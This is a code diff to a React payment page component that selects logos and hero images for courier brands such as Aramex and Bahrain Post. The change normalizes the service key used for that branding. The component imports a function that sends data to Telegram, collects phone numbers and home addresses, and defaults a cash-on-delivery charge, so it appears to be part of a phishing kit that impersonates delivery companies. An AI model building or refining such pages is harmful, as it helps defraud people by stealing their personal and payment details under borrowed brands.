@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBranding, normalizeServiceKey } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -34,8 +34,9 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const rawServiceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const serviceName = linkData?.payload?.service_name || rawServiceKey;
+  const serviceKey = normalizeServiceKey(rawServiceKey, serviceName);
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
@@ -61,7 +62,7 @@ const PaymentRecipient = () => {
     'bahpost': heroBahpost,
   };
   
-  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
+  const heroImage = heroImages[serviceKey] || heroBg;
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
